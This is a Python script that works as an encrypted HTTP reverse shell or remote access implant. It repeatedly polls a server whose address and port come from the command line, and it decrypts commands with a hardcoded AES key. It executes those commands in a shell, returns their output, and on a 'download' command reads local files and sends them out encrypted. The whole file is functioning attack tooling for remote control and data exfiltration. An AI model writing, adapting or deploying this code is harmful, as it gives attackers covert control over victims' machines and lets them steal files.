#!/usr/bin/python3
import urllib.request
import urllib.parse
import http.client
import subprocess
import sys
import base64
import os
from Crypto import Random
from Crypto.Cipher import AES
import hashlib

password = "CZN.pjp0paz3jej5jgajcj!hzx3yzp2DTB1hgy"

def encrypt(raw, password, downloadFlag):
    private_key = hashlib.sha256(password.encode("utf-8")).digest()
    iv = Random.new().read(AES.block_size)
    cipher = AES.new(private_key, AES.MODE_CFB, iv)
    if downloadFlag == 0:  # cmd
        return base64.b64encode(iv + cipher.encrypt(str.encode(raw)))
    return base64.b64encode(iv + cipher.encrypt(raw))  # download


def decrypt(enc, password):
    private_key = hashlib.sha256(password.encode("utf-8")).digest()
    enc = base64.b64decode(enc)
    iv = enc[:16]
    cipher = AES.new(private_key, AES.MODE_CFB, iv)
    return cipher.decrypt(enc[16:])


try:
    address = sys.argv[1]
    port = sys.argv[2]
except IndexError:
    sys.exit()

while True:
    # Prepare the GET request
    req = urllib.request.Request(f'http://{address}:{port}/')  # Adjusted to request the root path
    try:
        message = urllib.request.urlopen(req).read()
        message = str(decrypt(message, password), 'utf-8')
    except Exception as e:
        print(f"Error during GET request: {e}")
        continue  # Retry the loop on error

    if message == "quit" or message == "exit":
        sys.exit()
    elif message[:8] == "download":
        filename = message.split(' ')[1]
        if os.path.exists(filename):
            with open(filename, 'rb') as f:
                data = f.read()
                data = encrypt(data, password, 1)
                data = urllib.parse.urlencode({'file': data})
        else:
            data = encrypt(f"No such file or directory: {filename}", password, 0)
            data = urllib.parse.urlencode({'cmd': data})
    else:
        # Execute the command received from the server
        proc = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        data = proc.stdout.read() + proc.stderr.read()
        data = encrypt(str(data, 'utf-8'), password, 0)
        data = urllib.parse.urlencode({'cmd': data})

    # Prepare and send the POST request with command output
    h = http.client.HTTPConnection(f'{address}:{port}')
    headers = {
        "User-Agent": "Python-urllib/3.11",
        "Content-type": "application/x-www-form-urlencoded",
        "Accept": "text/plain"
    }
    try:
        h.request('POST', '/', data, headers)  # Adjusted to send to the root path
    except Exception as e:
        print(f"Error during POST request: {e}")